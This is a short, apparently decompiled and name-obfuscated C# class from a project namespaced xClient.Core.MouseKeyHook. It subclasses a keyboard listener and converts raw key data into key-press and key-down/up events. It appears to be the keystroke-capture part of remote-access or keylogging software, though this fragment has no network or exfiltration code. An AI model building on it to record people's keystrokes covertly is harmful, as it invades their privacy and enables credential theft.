using System.Collections.Generic;
using xClient.Core.MouseKeyHook.Implementation;

internal class Class15 : KeyListener
{
	public Class15()
		: base(Class4.smethod_1)
	{
	}

	protected override IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data)
	{
		return GEventArgs1.smethod_0(data);
	}

	protected override GEventArgs0 GetDownUpEventArgs(Struct1 data)
	{
		return GEventArgs0.smethod_0(data);
	}
}
